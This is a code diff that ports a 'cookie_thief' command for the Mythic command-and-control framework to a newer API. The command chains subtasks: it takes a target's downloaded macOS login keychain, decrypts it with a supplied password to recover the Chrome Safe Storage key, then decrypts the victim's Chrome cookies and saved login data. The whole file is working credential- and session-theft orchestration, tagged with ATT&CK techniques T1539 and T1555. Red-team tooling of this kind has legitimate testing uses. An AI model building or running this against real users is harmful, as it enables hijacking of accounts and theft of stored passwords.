@@ -1,6 +1,7 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 import sys
+from mythic_container.logging import logger
 
 
 class CookieThiefArguments(TaskArguments):
@@ -49,6 +50,157 @@ class CookieThiefArguments(TaskArguments):
         self.load_args_from_json_string(self.command_line)
 
 
+async def downloads_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    response = PTTaskCompletionFunctionMessageResponse(Success=True)
+    files = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+        TaskID=completionMsg.TaskData.Task.ID,
+        LimitByCallback=True,
+        Filename="login.keychain-db",
+        IsDownloadFromAgent=True,
+        IsPayload=False,
+        IsScreenshot=False,
+    ))
+    if files.Success:
+        for f in files.Files:
+            if f.TaskID == completionMsg.TaskData.Task.ID:
+                # we found a login.keychain-db file from our subtask
+                await SendMythicRPCFileUpdate(MythicRPCFileUpdateMessage(
+                    AgentFileID=f.AgentFileId,
+                    Comment=completionMsg.TaskData.args.get_arg('username')
+                ))
+                decryptTask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
+                    TaskID=completionMsg.TaskData.Task.ID,
+                    CommandName="decrypt_keychain",
+                    Params=json.dumps({
+                        "password": completionMsg.TaskData.args.get_arg('password'),
+                        "username": completionMsg.TaskData.args.get_arg('username'),
+                        "file_id": f.AgentFileId
+                    }),
+                    SubtaskCallbackFunction="decrypt_complete"
+                ))
+                if not decryptTask.Success:
+                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                        TaskID=completionMsg.TaskData.Task.ID,
+                        Response=decryptTask.Error.encode()
+                    ))
+                    response.Success = False
+                    response.TaskStatus = "error: Failed to issue decryption subtask"
+                    response.Stderr = decryptTask.Error
+                    return response
+                return response
+        response.Success = False
+        response.TaskStatus = "error: Failed to find keychain file"
+        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+            TaskID=completionMsg.TaskData.Task.ID,
+            Response="error: Failed to find keychain file".encode()
+        ))
+        return response
+    else:
+        response.Success = False
+        response.TaskStatus = "error: Failed to search for files"
+        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+            TaskID=completionMsg.TaskData.Task.ID,
+            Response=f"error: Failed to search for files: {files.Error}".encode()
+        ))
+        return response
+
+
+async def decrypt_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    # now we should have some credentials, specifically the chrome safe storage credential
+    # task is the cookie_thief command, subtask is the result of my decrypt_keychain command
+    response = PTTaskCompletionFunctionMessageResponse(Success=True)
+    chrome_password = await SendMythicRPCCredentialSearch(MythicRPCCredentialSearchMessage(
+        TaskID=completionMsg.TaskData.Task.ID,
+        Credential=MythicRPCCredentialData(
+            account="Chrome",
+            realm="Chrome Safe Storage",
+            comment=completionMsg.TaskData.args.get_arg('username')
+        )
+    ))
+    if chrome_password.Success:
+        if len(chrome_password.Credentials) > 0:
+            files = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+                TaskID=completionMsg.TaskData.Task.ID,
+                Filename="Cookies",
+                IsDownloadFromAgent=True,
+                LimitByCallback=True
+            ))
+            if files.Success:
+                if len(files.Files) > 0:
+                    for f in files.Files:
+                        if f.TaskID == completionMsg.TaskData.Task.ID:
+                            await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
+                                TaskID=completionMsg.TaskData.Task.ID,
+                                CommandName="decrypt_chrome_cookies",
+                                Params=json.dumps({
+                                    "username": completionMsg.TaskData.args.get_arg('username'),
+                                    "password": chrome_password.Credentials[0].Credential,
+                                    "file_id": f.AgentFileId
+                                }),
+                                SubtaskCallbackFunction="decrypted_cookies"
+                            ))
+                else:
+                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                        TaskID=completionMsg.TaskData.Task.ID,
+                        Response=f"No 'Cookies' file detected from Task {completionMsg.SubtaskData.Task.ID}\n".encode()
+                    ))
+            else:
+                response.Success = False
+                response.Error = files.Error
+                return response
+            files = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+                TaskID=completionMsg.TaskData.Task.ID,
+                Filename="Login Data",
+                LimitByCallback=True,
+                IsDownloadFromAgent=True,
+            ))
+            if files.Success:
+                if len(files.Files) > 0:
+                    for f in files.Files:
+                        if f.TaskID == completionMsg.TaskData.Task.ID:
+                            await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
+                                TaskID=completionMsg.TaskData.Task.ID,
+                                CommandName="decrypt_chrome_login_data",
+                                Params=json.dumps({
+                                    "username": completionMsg.TaskData.args.get_arg('username'),
+                                    "password": chrome_password.Credentials[0].Credential,
+                                    "file_id": f.AgentFileId
+                                }),
+                                SubtaskCallbackFunction="decrypted_cookies"
+                            ))
+                else:
+                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                        TaskID=completionMsg.TaskData.Task.ID,
+                        Response=f"No 'Login Data' file detected from Task {completionMsg.SubtaskData.Task.ID}\n".encode()
+                    ))
+            else:
+                response.Success = False
+                response.Error = files.Error
+                return response
+        else:
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=completionMsg.TaskData.Task.ID,
+                Response=f"Failed to find a chrome storage password for {completionMsg.TaskData.args.get_arg('username')}".encode()
+            ))
+            response.Success = False
+            response.Error = "Error: Failed to Find Chrome Storage Password"
+            return response
+    else:
+        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+            TaskID=completionMsg.TaskData.Task.ID,
+            Response=f"Failed to search for passwords: {chrome_password.Error}".encode()
+        ))
+        response.Success = False
+        response.Error = "Error: Failed to Find Chrome Storage Password"
+        return response
+    return response
+
+
+async def decrypted_cookies(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success")
+    return response
+
+
 class CookieThiefCommand(CommandBase):
     cmd = "cookie_thief"
     needs_admin = False
@@ -61,109 +213,20 @@ class CookieThiefCommand(CommandBase):
     attackmapping = ["T1539", "T1555"]
     argument_class = CookieThiefArguments
     browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")
+    completion_functions = {
+        "downloads_complete": downloads_complete,
+        "decrypt_complete": decrypt_complete,
+        "decrypted_cookies": decrypted_cookies
+    }
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
-        task.completed_callback_function = self.downloads_complete
-        return task
+    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
+        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
+        response.CompletionFunctionName = "downloads_complete"
+        return response
 
-    async def process_response(self, response: AgentResponse):
-        pass
-
-    async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
-        if task.status == MythicStatus.Completed:
-            responses = await MythicRPC().execute("get_responses", task_id=task.id)
-            if responses.status == MythicStatus.Success:
-                for f in responses.response["files"]:
-                    await MythicRPC().execute("update_file", file_id=f["agent_file_id"],
-                                              comment=task.args.get_arg('username'))
-                    if f["filename"] == "login.keychain-db":
-
-                        task.status = MythicStatus("delegating")
-                        decryptTask = await MythicRPC().execute("create_subtask",
-                                                                parent_task_id=task.id,
-                                                                command="decrypt_keychain",
-                                                                params_dict={
-                                                                    "password": task.args.get_arg("password"),
-                                                                    "username": task.args.get_arg("username"),
-                                                                    "file_id": f["agent_file_id"]
-                                                                },
-                                                                subtask_callback_function="decrypt_complete")
-                        if decryptTask.status == MythicRPCStatus.Success:
-                            pass
-                        else:
-                            await MythicRPC().execute("create_output", task_id=task.id,
-                                                      output=decryptTask.error)
-                            task.status = MythicStatus("Error: Failed to issue decryption subtask")
-                return task
-        else:
-            await MythicRPC().execute("create_output", task_id=task.id,
-                                      output="Not automatically decrypting since downloading failed\n")
-        return task
-
-    async def decrypt_complete(self, task: MythicTask, subtask: dict = None,
-                                 subtask_group_name: str = None) -> MythicTask:
-        # now we should have some credentials, specifically the chrome safe storage credential
-        # task is the cookie_thief command, subtask is the result of my decrypt_keychain command
-        if subtask["status"] == "completed":
-            chrome_password = await MythicRPC().execute("get_credential",
-                                                        task_id=task.id,
-                                                        account="Chrome",
-                                                        realm="Chrome Safe Storage",
-                                                        comment=task.args.get_arg("username"))
-            if chrome_password.status == MythicRPCStatus.Success and len(chrome_password.response) > 0:
-                task.status = MythicStatus("delegating")
-                responses = await MythicRPC().execute("get_responses", task_id=task.id)
-                if responses.status == MythicStatus.Success:
-                    for f in responses.response["files"]:
-                        if f["filename"].lower() == "cookies":
-                            cookie_decrypt_task = await MythicRPC().execute("create_subtask",
-                                                                            parent_task_id=task.id,
-                                                                            command="decrypt_chrome_cookies",
-                                                                            params_dict={
-                                                                                "username": task.args.get_arg("username"),
-                                                                                "password": chrome_password.response[0]["credential"],
-                                                                                "file_id": f["agent_file_id"]
-                                                                            },
-                                                                            subtask_callback_function="decrypted_cookies")
-                            if cookie_decrypt_task.status == MythicRPCStatus.Success:
-                                continue
-                            else:
-                                await MythicRPC().execute("create_output", task=task.id,
-                                                          output=cookie_decrypt_task.error)
-                                task.status = MythicStatus("Error: Decrypt Cookie Error")
-                        if "data" in f["filename"].lower():
-                            cookie_decrypt_task = await MythicRPC().execute("create_subtask",
-                                                                            parent_task_id=task.id,
-                                                                            command="decrypt_chrome_login_data",
-                                                                            params_dict={
-                                                                                "username": task.args.get_arg("username"),
-                                                                                "password": chrome_password.response[0]["credential"],
-                                                                                "file_id": f["agent_file_id"]
-                                                                            },
-                                                                            subtask_callback_function="decrypted_cookies")
-                            if cookie_decrypt_task.status == MythicRPCStatus.Success:
-                                continue
-                            else:
-                                await MythicRPC().execute("create_output", task=task.id,
-                                                          output=cookie_decrypt_task.error)
-                                task.status = MythicStatus("Error: Decrypt Cookie Error")
-                    return task
-            else:
-                await MythicRPC().execute("create_output", task=task.id,
-                                          output=f"Failed to find a chrome storage password for {task.args.get_arg('username')}")
-                task.status = MythicStatus("Error: Failed to Find Chrome Storage Password")
-        else:
-            await MythicRPC().execute("create_output",
-                                      task_id=task.id,
-                                      output="Login Keychain decryption failed, not continuing on to decrypt cookies")
-        return task
-
-    async def decrypted_cookies(self, task: MythicTask, subtask: dict = None,
-                               subtask_group_name: str = None) -> MythicTask:
-        if subtask["status"] == "completed":
-            task.status = MythicStatus.Completed
-            return task
-        else:
-            task.status = MythicStatus("Error: cookie decryption failed")
-            return task
-
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+        return resp
